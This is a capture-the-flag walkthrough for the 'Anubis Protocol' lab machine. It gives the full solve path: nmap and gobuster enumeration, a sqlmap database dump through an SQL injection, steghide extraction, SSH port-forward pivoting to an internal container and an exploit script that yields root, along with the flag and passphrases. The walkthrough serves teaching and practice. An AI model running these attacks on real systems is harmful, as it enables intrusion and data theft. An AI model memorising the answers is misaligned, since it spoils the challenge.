# The Anubis Protocol — Official Walkthrough

This guide details the complete intended solve path for the "Anubis Protocol" CTF challenge.

---

## Phase 1: Reconnaissance
Start with a standard Nmap scan to discover open ports:
```bash
nmap -sC -sV <TARGET_IP>
```
**Results:**
- Port 21: FTP (Anonymous login allowed)
- Port 22: SSH (Key-based authentication only)
- Port 80: HTTP (Node.js Web Server)

## Phase 2: FTP Enumeration
Connect to the FTP server using anonymous credentials:
```bash
ftp <TARGET_IP>
# Name: anonymous
# Password: <blank>
```
List the files and download everything you find:
```bash
get warning.txt
get archivist_dictionary.txt
```
Read `warning.txt`. It gives you several hints:
- *"The drafts were never meant for the catalogue."* → Look for backup files.
- *"Those who return with the same offering earn the trust of the scales."* → You'll need to submit an answer repeatedly later.
- *"not all that is shown is meant to be seen."* → Steganography is involved.

You now have `archivist_dictionary.txt`, which is a custom wordlist specifically for this machine.

## Phase 3: Web Enumeration
Run a directory brute-force attack using the **custom wordlist** you found, making sure to search for `.bak` files:
```bash
gobuster dir -u http://<TARGET_IP>/ -w archivist_dictionary.txt -x txt,html,bak,js
```
**Key discoveries:**
- `/scroll1.html` & `/scroll2.html` (Lore pages)
- `/catalogue-note.bak` (Hint file)
- `/archive_map.js` (Reveals the `/api/search` endpoint)
- `/field_report_s12.txt` (Hidden lore)
- `/weighing_of_hearts.html` (The judgement chamber)

## Phase 4: First Sacred Word (WISDOM)
Inspect the HTTP headers of the main web page:
```bash
curl -I http://<TARGET_IP>/
```
You will notice a custom header: `X-Excavation-Ref: KH-VII-4`.
According to Scroll I, the first sacred word is filed alongside the site's primary designation. Use the `/api/search` endpoint found in the JS file:
```bash
curl "http://<TARGET_IP>/api/search?q=KH-VII-4"
```
The database returns: *"The word recorded was **WISDOM**."*

## Phase 5: Second Sacred Word (OVER)
Read Scroll II. It mentions that hidden messages (steganography) are protected by the "patron deity of scribes".
1. The patron deity of scribes is **Thoth**.
2. Look closely at the papyrus image on Scroll II — the word `Th0th` is faintly visible.
3. Download the image and extract the hidden data using `steghide`:
```bash
wget http://<TARGET_IP>/papyrus_fragment.jpg
steghide extract -sf papyrus_fragment.jpg -p "Th0th"
cat secret.txt
```
The file reveals the second word: **`OVER`**.

## Phase 6: Third Sacred Word (POWER)
The search endpoint is vulnerable to SQL Injection. Use `sqlmap` to dump the database:
```bash
sqlmap -u "http://<TARGET_IP>/api/search?q=1" --dump-all
```
In the `secrets` table, you will find a riddle: *"what pharaohs held above all mortals"*. 
The answer to the riddle is the third word: **`POWER`**.

**Combined Passphrase:** `WISDOM_OVER_POWER`

## Phase 7: Assembling the SSH Username
The username must be assembled from scattered lore:
1. **Personal Name:** `khasem` (from Scroll I)
2. **Connector:** `_` (underscores used by scribes)
3. **Rank:** `7th` (from `field_report_s12.txt`)
4. **Office:** `scribe` (from Scroll II)

**Full Username:** `khasem_7th_scribe`

## Phase 8: The Patience Gauntlet (Getting the SSH Key)
1. Go to `http://<TARGET_IP>/weighing_of_hearts.html`.
2. Enter the passphrase: `WISDOM_OVER_POWER`.
3. Click "Weigh the Heart". The server will reply "TRY AGAIN".
4. **Wait 2 seconds** (the cooldown period), then click it again. 
5. Repeat this 3 to 5 times without altering the text.
6. The server will eventually grant access and provide a download link for an `id_rsa` key. Download it immediately before the 90-second token expires!

## Phase 9: Initial Access & Network Discovery
Log into the machine via SSH:
```bash
chmod 600 id_rsa
ssh -i id_rsa khasem_7th_scribe@<TARGET_IP>
```
You will find `user.txt` and `flag.txt` in the home directory, but reading them reveals they are **fake traps**. The real flag is deeper.

1. List hidden files to find the first half of the Secret Name:
```bash
cat ~/.archives/.burial_record
# Output: Kh4s3m_Th3_3t3rn4l
```
2. Read the SSH banner and check network interfaces to discover an internal container:
```bash
cat /etc/hosts
# Output shows: 172.19.0.13 sanctum
```

## Phase 10: Pivoting to the Inner Sanctum
Set up local port forwarding to reach the internal container's web server (8080) and gateway (9999):
```bash
ssh -i id_rsa -L 8080:172.19.0.13:8080 -L 9999:172.19.0.13:9999 khasem_7th_scribe@<TARGET_IP>
```

1. Open `http://localhost:8080` in your browser.
2. Read the text on the wall image to find the second half of the Secret Name: `_Gu4rd14n_0f_Th3_D34d`.
3. Combine them: `Kh4s3m_Th3_3t3rn4l_Gu4rd14n_0f_Th3_D34d`.
4. Download `exploit_template.py` from the page.

## Phase 11: The Final Gateway (Root)
Edit the `exploit_template.py` script with your gathered intel:
```python
PORT = 9999
TARGET = "Kh4s3m_Th3_3t3rn4l_Gu4rd14n_0f_Th3_D34d"
OFFICE = "Ahmose" # (The scribe you replaced, according to Scroll I)
```

Run the script:
```bash
python3 exploit_template.py
```
The binary will prompt for the Secret Name, accept it, and then ask:
*"The 7th scribe stands before me. Who did you replace?: "*

The script will automatically send `Ahmose`. The tomb will open, granting you a root shell.

```bash
whoami
# root
cat /root/root.txt
# necrosand{TH3_ANUB1S_PR0T0C0L_C0MPL3T3}
```
**Challenge Complete!**
